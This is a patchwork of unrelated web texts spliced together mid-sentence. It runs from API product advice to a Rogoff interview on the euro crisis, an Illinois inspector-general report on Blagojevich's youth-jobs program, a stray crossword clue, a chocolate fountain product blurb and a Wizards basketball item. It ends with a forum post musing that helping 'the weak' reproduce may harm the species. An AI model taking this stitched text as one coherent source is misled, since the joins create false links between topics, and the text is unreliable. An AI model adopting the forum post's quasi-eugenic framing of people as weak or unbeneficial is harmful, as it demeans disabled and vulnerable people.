Elevate Web Services Into API Products for DevelopersThis is about taking the old back end of 75 SOAP (Simple Object Access Protocol) services trying to talk to each other and creating a product that developers can actually use. Mediate between SOAP and REST (representational state transfer) to try and get the cultures working together.
Solve Authorization Problems at the API BoundaryThe smarter, more proactive and more aggressive an organization is when putting in authentication at the API boundary, the more quickly value will be produced on the other side of it.
Connect People to PeoplePeople making software the value chain between the app and the API is human. Remember to align with the real world. Once you treat the API as a productknowing that the developer is the customerthat's when you're off to the races..Euro Area Bought Some Time in Staving Off Breakup: Rogoff.
European Union leaders at a June 28-29 summit agreed to loosen bailout rules, lay the foundations for a banking union and break the link between sovereign and banking debt through the direct recapitalization of lenders. Euro-area officials, fighting to prevent the sovereign-debt crisis from spreading, also took measures to bolster growth amid a global slowdown.
“They are going to continue to do more and more radical measures to stand still,” Rogoff said. “We’re very, very far from a long-term vision. It’s a long difficult path, still. We’re a long ways from stabilization.”
Leaders approved a 120 billion-euro plan to promote growth in the 27-nation bloc that includes a capital boost for the European Investment Bank.
Federal Reserve policy makers have said they are ready to take more steps should the U.S. expansion slacken. Rogoff said that while the U.S. economy is “slowing a bit,” it would be premature to say it’s headed back into a recession.
“Clearly this is not an economy in galloping growth that’s creating 300,000 or 400,000 net new jobs a month that we really need to start digging our way out of this,” he said. “The U.S., though not falling into immediate recession, is not an engine of growth that’s going to pull us out, with China slowing and Europe in recession.”.

The misspent money became the subject of a federal investigation and the Illinois Department of Transportation is trying to recoup some of the funds.
The Office of the Executive Inspector General review concluded the $7 million program in which Blagojevich promised to hire up to 10,000 youths for eight-week jobs ended up costing $7.8 million and resulted in only 3,500 youths getting jobs.
The report said transportation officials conducted an audit of the jobs program and findings were referred to Attorney General Lisa Madigan. In December 2010, Madigan’s office “responded to the referral stating that the matter as the subject of an active federal investigation” and would not take action, the report said.
Randall Sanborn, a spokesman forU.S. Attorney Patrick Fitzgerald, had no comment Monday when asked if the investigation was ongoing. Fitzgerald’s office successfully prosecuted Blagojevich on federal corruption-related crimes and the former governor is serving a 14-year term in a Colorado prison.
The report said five Chicago nonprofit social service agencies that deal with minority, ethnic and disadvantaged youths administered the program for more than 100 service providers, including neighborhood churches.
The work was supposed to be transportation-related because the money came from the state’s road construction fund. But the audit of activity work sheets found several teens participating in non-transportation related work, ranging from “community organizing” and “moving furniture” to “help cart attendants at golf course” and “clean out ball washer.”
State transportation officials said they have sought to recoup more than $643,000 in overpayments to the five agencies that acted as financial administrators: Chicago Area Project, Westside Health Authority, Alternative School Network, Latin Women in Action and Black United Fund.
The Black United Fund repaid IDOT $170,000 — what it earned in administrative fees — while the four other nonprofit fiscal agents are disputing the bill, a transportation spokesman said.
Morris Reed, the CEO of Westside Health Authority, said the Department of Human Services ran the program on behalf of the transportation agency and promised a flat administrative fee. Reed contended that after payments went out to youth workers and service providers, IDOT later sought to change the terms of the contracts.
“At the end of the day, they’re trying to hold community agencies responsible,” Reed said. “IDOT provided the funds. They really should be going after DHS.”
Reed said he was not familiar with a federal investigation and had not been contacted by agents.
Blagojevich cobbled together the program out of road-fund dollars after lawmakers rejected his plans for a massive public works program incorporating a youth jobs effort.
Though transportation officials had questioned making a second round of payments because of “red flags” about the jobs workers had performed, one unidentified agency official said “there was considerable pressure from… (Blagojevich’s office) to just keep this program going,” the report said.
An unidentified top transportation official interviewed by the state executive inspector general’s office was quoted as calling the program “a disaster” and “thrown together at the last minute.”Clue: Tito's real name

That chocolate fountain? Imagine it: a 16-foot-tall tower of gushing chocolate, always ready at your disposal. Wake up in the morning, look out through the window and across the lawn, and gaze upon one of mankind's greatest treasures. Simply go outside, take your morning cup of coffee, and hold it under the flowing waterfall of chocolate.
Unfortunately such simple pleasures can be monstrously unattainable. Luckily, the Select Home Chocolate Fondue Fountain can fill in the gap until you can afford your dream fountain. Standing at a respectable 16 inches, this chocolate fountain is a good deal more accessible. Perfect for parties and get-togethers, it won't break the budget to bust out and fill this up with enough chocolate for everybody. The heated basin holds 4 pounds of chocolate, which, when melted, cascades down the three-tier structure, supplying enough liquid chocolate for up to 20 guests.
Of course, setting this up as a permanent fixture in your decor is also an option. It may not be the Chocolate Trevi Fountain you always wanted, but think of all the construction costs you will save. Consider this a stepping-stone along the path toward realization of your dream fountain in the back yard--and meanwhile take solace in the thought that none of your guests is likely to throw coins into this delicious chocolate fountain.Never shy to shoot the basketball, Jordan Crawford is not shy telling you that he is the Wizards' starting shooting guard until he is told otherwise.
With restricted free agent Nick Young mulling his options, Crawford again has taken advantage of the opportunity in training camp to earn the starting job. Last season, when Young went down with injury, Crawford stepped in for him and averaged 19 points a game.
"You know I'm looking forward to getting out there as a starter if Nick doesn't come back," Crawford said after Tuesday's practice. "If Nick does come back, I want to be an asset to this team to make a run."
Crawford told me he wants to be more consistent in just his second NBA season.
"It's rough having games back to back, no days off,traveling across the country, so just being consistent," he said.
With the lockout-condensed season, starter or no starter, Crawford will be getting up his shots -- its just a matter of whether they will go down.

By taking away elements of natural selection, how harmful, if you see any harm at all, do you think this practice will be to the future of our kind?
The general fear I would recognize is that we are rewarding our weak or unbenificial qualities to continue to pass to future generations at a higher rate. This makes our intelligence much more important to sustain us, the problem from there is that we are therefore not rewarding the more intelligent of our species with reproducing at a higher rate.
On the other hand, empathy is important for the social structure that we rely on, and with that comes said help to the weak and allowance that they can pass on their genes. We are extremely dependant on our group mentality and cannot have that without protecting the members of the group physically, as well as emotionally or else run the risk of the group parting ways and making smaller weaker groups that are less likely to succeed.
Where do you stand?
